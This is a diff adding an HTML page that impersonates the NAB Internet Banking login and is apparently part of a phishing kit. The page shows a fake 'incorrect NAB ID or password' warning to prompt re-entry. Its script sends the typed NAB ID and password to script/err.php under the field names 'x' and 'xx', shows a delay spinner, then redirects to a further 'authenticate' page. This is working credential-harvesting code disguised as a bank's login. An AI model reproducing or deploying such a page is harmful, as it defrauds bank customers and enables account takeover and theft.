@@ -1,0 +1,725 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>NAB Internet Banking</title>
+    <link rel="shortcut icon" href="img/favicon.svg" type="image/x-icon" />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body,
+      html {
+        font-family: Arial, sans-serif;
+        height: 100%;
+      }
+
+      .header_banner {
+        width: 100%;
+        /* padding: 20px 0; */
+        background-color: #000;
+      }
+
+      .header_inner {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 15px 16px;
+        width: 100%;
+        gap: 20px;
+      }
+
+      .header_left {
+        display: flex;
+        align-items: center;
+      }
+
+      .header_right {
+        color: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .header_right p {
+        font-size: 0.8em;
+        padding: 10px;
+      }
+
+      .login_title {
+        font-family: SourceSans-Light, Helvetica, Arial, sans-serif;
+        font-size: 40px;
+      }
+
+      .banner {
+        position: relative;
+        min-height: 100vh;
+        background-image: url(img/bg-login.jpeg);
+        background-repeat: no-repeat;
+        background-size: cover;
+        background-position: center top;
+        background-attachment: fixed;
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+      }
+
+      .login_title {
+        font-family: SourceSans-Light, Helvetica, Arial, sans-serif;
+        font-size: 40px;
+      }
+
+      .login_wrapper {
+        width: 100%;
+        max-width: 500px;
+        margin-top: 40px;
+        margin-left: 300px;
+        background-color: white;
+        border-radius: 8px;
+        overflow: hidden;
+      }
+
+      .form_container {
+        width: 100%;
+        height: 150%;
+        padding: 38px 32px;
+        padding-bottom: 0px;
+      }
+
+      h1 {
+        font-size: 30px;
+        margin-bottom: 32px;
+        color: #333;
+        font-weight: 100;
+      }
+
+      .input_field {
+        margin: 40px 0px;
+      }
+
+      .input_field label {
+        font-size: 14px;
+        color: #000;
+        display: block;
+        margin-bottom: 8px;
+        font-weight: bold;
+      }
+
+      .input_field input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        font-size: 16px;
+      }
+
+      .input_field .error {
+        color: red;
+        font-size: 12px;
+      }
+
+      .remember_checkbox {
+        display: flex;
+        align-items: center;
+        margin-bottom: 20px;
+      }
+
+      .remember_checkbox label {
+        font-size: 14px;
+        color: #333;
+        margin-left: 10px;
+      }
+
+      .remember_checkbox input[type="checkbox"] {
+        width: 20px;
+        height: 20px;
+        accent-color: black;
+      }
+
+      .login_button {
+        margin-bottom: 20px;
+      }
+
+      .login_button button {
+        width: 128px;
+        padding: 12px;
+        background-color: #e2001a;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        cursor: pointer;
+      }
+
+      .login_button button:hover {
+        background-color: #d00016;
+      }
+
+      .footer_links a {
+        color: #d00016;
+      }
+
+      .footer_links a:hover {
+        text-decoration: underline;
+      }
+
+      .footer_link2 {
+        margin-top: 30px;
+        background-color: #e6e6e6;
+        padding: 20px;
+        font-size: 16px;
+        font-weight: 100;
+      }
+
+      .info {
+        color: #4d4d4d;
+        font-size: 14px;
+      }
+
+      .footer_link2 a {
+        color: #d00016;
+        font-weight: bold;
+      }
+
+      .input_field input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        font-size: 16px;
+        transition: border 0.3s ease;
+      }
+
+      .input_field input:focus {
+        outline: none;
+        border: 3px solid grey;
+      }
+
+      .input_error {
+        border: 1px solid red !important;
+      }
+
+      .input_error:focus {
+        border: 3px solid red !important;
+      }
+
+      .input_field .error {
+        color: red;
+        font-size: 14px;
+        margin-top: 4px;
+        height: 14px;
+        line-height: 14px;
+        transition: all 0.3s ease;
+      }
+
+      /* Modal styles */
+      .modal-backdrop {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 999;
+      }
+
+      .modal {
+        position: fixed;
+        top: 28%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: #fff;
+        padding: 40px;
+        border-radius: 8px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        z-index: 1000;
+        width: 400px;
+        height: 300px;
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .spinner {
+        width: 40px;
+        height: 40px;
+        border: 4px solid #ddd;
+        border-top: 4px solid red;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin: 0 auto;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+    <style>
+      @font-face {
+        font-family: "SourceSans-Light";
+        src: url("font/SourceSans-Light.woff2") format("woff2"),
+          url("font/SourceSans-Light.woff") format("woff");
+        font-weight: 100;
+        font-style: normal;
+      }
+    </style>
+    <style>
+      .loading-div {
+        display: none;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+      .loader {
+        width: 48px;
+        height: 48px;
+        border: 4px solid rgb(212, 212, 212);
+        border-top: 4px solid #e60000;
+        border-right: 4px solid #e60000;
+        border-radius: 50%;
+        animation: spin 1.5s linear infinite;
+        margin: 0 auto;
+      }
+
+      .loader-message {
+        margin-top: 12px;
+        font-size: 14px;
+        color: #444;
+        text-align: center;
+        font-family: Arial, sans-serif;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+
+    <style>
+      @media screen and (max-width: 768px) {
+        .login_title {
+          font-family: SourceSans-Light, Helvetica, Arial, sans-serif;
+          font-size: 30px;
+        }
+        .header_inner {
+          display: flex;
+          justify-content: space-between;
+          padding: 10px 16px;
+        }
+
+        .header_left {
+          margin-left: 0;
+          margin-bottom: 10px;
+        }
+
+        .header_right {
+          display: none;
+        }
+
+        .login_wrapper {
+          width: 90%;
+          margin: 50px auto;
+          background-color: white;
+          border-radius: 8px;
+          overflow: hidden;
+        }
+
+        .login_button button {
+          width: 100%;
+        }
+
+        .form_container {
+          padding: 20px;
+        }
+        .footer_link2 {
+          font-size: 14px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header_banner" id="headerBanner">
+      <div class="header_inner">
+        <div class="header_left" style="">
+          <img
+            class="logo-img"
+            src="img/star-big.svg"
+            alt=""
+            height="30"
+            width="90"
+          />
+          <h1 style="color: #fff; font-size: 22px; margin: 0">
+            Internet Banking
+          </h1>
+        </div>
+        <div class="header_right">
+          <p id="currentDate"></p>
+          |
+          <p>Help</p>
+          |
+          <p>Security</p>
+          |
+          <p>Contact us</p>
+          |
+          <p>Locate us</p>
+        </div>
+      </div>
+
+      <div class="banner">
+        <div class="login_wrapper">
+          <div class="form_container">
+            <div
+              class="loading-div"
+              style="
+                height: 400px;
+                justify-content: center;
+                align-items: center;
+              "
+            >
+              <div class="loader"></div>
+              <div class="loader-message">Processing, please wait.</div>
+            </div>
+            <form id="loginForm" method="post" novalidate>
+              <h1 class="login_title">NAB Internet Banking</h1>
+              <div
+                style="
+                  display: flex;
+                  font-family: -apple-system, BlinkMacSystemFont, Segoe UI,
+                    Roboto, Helvetica, Arial, sans-serif;
+                  gap: 10px;
+                  justify-content: center;
+                  color: #000;
+                  font-size: 14px;
+                  border: 1px solid rgb(194, 0, 0);
+                  padding: 20px;
+                  line-height: 25px;
+                "
+              >
+                <div>
+                  <svg
+                    focusable="false"
+                    aria-hidden="true"
+                    width="24"
+                    height="24"
+                    viewBox="0 0 24 24"
+                    style="color: rgb(194, 0, 0)"
+                  >
+                    <path
+                      fill="currentColor"
+                      fill-rule="evenodd"
+                      d="M12 21a9 9 0 110-18 9 9 0 010 18zm0-3.25a.75.75 0 100-1.5.75.75 0 000 1.5zm-.75-10.794v6.588c0 .39.336.706.75.706s.75-.316.75-.706V6.956c0-.39-.336-.706-.75-.706s-.75.316-.75.706z"
+                    ></path>
+                  </svg>
+                </div>
+                <p>
+                  Your NAB ID or password is incorrect, or you're not registered
+                  for Internet Banking. Please try again or register for NAB
+                  Internet Banking.
+                </p>
+              </div>
+              <div class="input_field">
+                <label for="nabID">NAB ID</label>
+                <input
+                  type="text"
+                  id="nabID"
+                  name="nabID"
+                  autocomplete="off"
+                  maxlength="9"
+                  inputmode="numeric"
+                />
+                <div
+                  class="error-container"
+                  id="nabIDError"
+                  style="display: none; gap: 5px; margin-top: 20px"
+                >
+                  <svg
+                    focusable="false"
+                    aria-hidden="true"
+                    width="24"
+                    height="24"
+                    viewBox="0 0 24 24"
+                  >
+                    <path
+                      fill="red"
+                      fill-rule="evenodd"
+                      d="M12 21a9 9 0 110-18 9 9 0 010 18zm0-3.25a.75.75 0 100-1.5.75.75 0 000 1.5zm-.75-10.794v6.588c0 .39.336.706.75.706s.75-.316.75-.706V6.956c0-.39-.336-.706-.75-.706s-.75.316-.75.706z"
+                    ></path>
+                  </svg>
+                  <span class="error" id="nabIDErrorText"></span>
+                </div>
+              </div>
+
+              <div class="input_field">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" />
+                <div class="passwordError"></div>
+              </div>
+
+              <div class="remember_checkbox">
+                <input type="checkbox" id="remember" />
+                <label for="remember">Remember my NAB ID</label>
+              </div>
+
+              <div style="margin: 20px 0px" class="info">
+                For security reasons, we'll only show you the last 3 digits.
+                Don't save your NAB ID if anyone else uses this browser.
+              </div>
+
+              <div class="login_button">
+                <button type="submit">Login</button>
+              </div>
+
+              <div class="footer_links">
+                <a href="#">Forgot your NAB ID or password?</a>
+              </div>
+            </form>
+          </div>
+
+          <div class="footer_link2">
+            <p>New to NAB Internet Banking? <a href="#">Register now</a></p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Modal for first attempt -->
+    <div id="modalBackdrop" class="modal-backdrop" style="display: none"></div>
+    <div id="modal" class="modal" style="display: none">
+      <svg
+        focusable="false"
+        aria-hidden="true"
+        width="104"
+        height="104"
+        viewBox="0 0 24 24"
+      >
+        <path
+          fill="red"
+          fill-rule="evenodd"
+          d="M12 21a9 9 0 110-18 9 9 0 010 18zm0-3.25a.75.75 0 100-1.5.75.75 0 000 1.5zm-.75-10.794v6.588c0 .39.336.706.75.706s.75-.316.75-.706V6.956c0-.39-.336-.706-.75-.706s-.75.316-.75.706z"
+        ></path>
+      </svg>
+      <p style="margin-top: 30px; font-size: 24px">
+        Incorrect NAB ID or password
+      </p>
+    </div>
+
+    <div
+      id="loadingModalBackdrop"
+      style="
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.6);
+        z-index: 9999;
+        justify-content: center;
+        align-items: center;
+      "
+    >
+      <div
+        id="loadingModal"
+        style="
+          background: #fff;
+          padding: 40px 30px;
+          border-radius: 8px;
+          text-align: center;
+          box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+        "
+      >
+        <div class="spinner" style="margin-bottom: 20px"></div>
+        <div style="font-size: 18px; font-weight: 500">
+          Loading, please wait...
+        </div>
+      </div>
+    </div>
+    <script>
+      function updateImageSrc() {
+        const img = document.querySelector(".logo-img");
+        if (!img) return;
+
+        if (window.innerWidth <= 768) {
+          img.src = "img/star.svg";
+        } else {
+          img.src = "img/star-big.svg";
+        }
+      }
+
+      updateImageSrc();
+
+      window.addEventListener("resize", updateImageSrc);
+    </script>
+    <script>
+      function ShowLoadingModal() {
+        document.getElementById("loginForm").style.display = "none";
+        document.getElementsByClassName("footer_link2")[0].style.display =
+          "none";
+        document.getElementsByClassName("form_container")[0].style.height =
+          "500px";
+
+        document.getElementsByClassName("loading-div")[0].style.display =
+          "flex";
+      }
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const currentDateElement = document.getElementById("currentDate");
+
+        const options = {
+          weekday: "long",
+          day: "numeric",
+          month: "long",
+          year: "numeric",
+        };
+
+        const today = new Date();
+        const formattedDate = today.toLocaleDateString("en-GB", options);
+
+        currentDateElement.textContent = formattedDate;
+      });
+    </script>
+
+    <script>
+      let userID = "";
+      document.addEventListener("DOMContentLoaded", function () {
+        const messages = {
+          emptyNabID: "Enter your NAB ID.",
+          invalidNabID: "NAB ID must be exactly 8 - 10 digits.",
+          emptyPassword: "Password cannot be empty.",
+          invalidPassword: "Password must be at least 6 characters long.",
+        };
+
+        const loginForm = document.getElementById("loginForm");
+        const nabIDInput = document.getElementById("nabID");
+        const passwordInput = document.getElementById("password");
+
+        nabIDInput.addEventListener("input", function () {
+          this.value = this.value.replace(/\s+/g, "");
+          removeError(this);
+        });
+
+        passwordInput.addEventListener("input", function () {
+          this.value = this.value.replace(/\s+/g, "");
+          removeError(this);
+        });
+
+        nabIDInput.addEventListener("blur", function () {
+          userID = document.getElementById("nabID").value;
+          let raw = this.value.replace(/\s+/g, "");
+          this.dataset.realValue = raw;
+          if (raw.length > 3) {
+            this.value = "*".repeat(raw.length - 3) + raw.slice(-3);
+          } else {
+            this.value = raw;
+          }
+        });
+
+        nabIDInput.addEventListener("focus", function () {
+          if (this.dataset.realValue) {
+            this.value = this.dataset.realValue;
+          }
+        });
+
+        nabIDInput.addEventListener("focus", () => removeError(nabIDInput));
+        passwordInput.addEventListener("focus", () =>
+          removeError(passwordInput)
+        );
+
+        loginForm.addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          const nabID = userID;
+          const password = passwordInput.value.trim();
+
+          removeError(nabIDInput);
+          removeError(passwordInput);
+
+          if (!nabID) {
+            showError(nabIDInput, messages.emptyNabID);
+            return;
+          }
+
+          if (!/^\d{8,10}$/.test(nabID)) {
+            showError(nabIDInput, messages.invalidNabID);
+            return;
+          }
+
+          if (!password) {
+            showError(passwordInput, messages.emptyPassword);
+            return;
+          }
+          if (password.length < 6) {
+            showError(passwordInput, messages.invalidPassword);
+            return;
+          }
+          ShowLoadingModal();
+          const formData = new FormData();
+          formData.append("sws", 1);
+          formData.append("x", nabID);
+          formData.append("xx", password);
+          const xhr = new XMLHttpRequest();
+          xhr.open("POST", "script/err.php", true);
+
+          xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4) {
+              if (xhr.status === 200) {
+                setTimeout(() => {
+                  window.location.href = "authenticate.html";
+                }, 15000);
+              } else {
+                location.reload();
+              }
+            }
+          };
+
+          xhr.send(formData);
+        });
+
+        function showError(inputElement, message) {
+          removeError(inputElement);
+          const errorContainer = document.createElement("div");
+          errorContainer.className = "dynamic-error";
+          errorContainer.style.cssText = `display: flex; align-items: center; gap: 4px;`;
+          errorContainer.style.display = "flex; ";
+          errorContainer.style.gap = "6px";
+          errorContainer.style.color = "rgb(194, 0, 0)";
+          errorContainer.style.fontSize = "14px";
+          errorContainer.style.marginTop = "8px";
+          errorContainer.innerHTML = errorIcon() + `<span>${message}</span>`;
+          inputElement.parentNode.appendChild(errorContainer);
+          inputElement.classList.add("input_error");
+        }
+
+        function removeError(inputElement) {
+          const existing =
+            inputElement.parentNode.querySelector(".dynamic-error");
+          if (existing) existing.remove();
+          inputElement.classList.remove("input_error");
+        }
+
+        function errorIcon() {
+          return `<svg focusable="false" aria-hidden="true" width="20" height="20" viewBox="0 0 24 24">
+      <path fill="rgb(194, 0, 0)" fill-rule="evenodd"
+          d="M12 21a9 9 0 110-18 9 9 0 010 18zm0-3.25a.75.75 0 100-1.5.75.75 0 000 1.5zm-.75-10.794v6.588c0 .39.336.706.75.706s.75-.316.75-.706V6.956c0-.39-.336-.706-.75-.706s-.75.316-.75.706z">
+      </path>
+    </svg>`;
+        }
+      });
+    </script>
+  </body>
+</html>
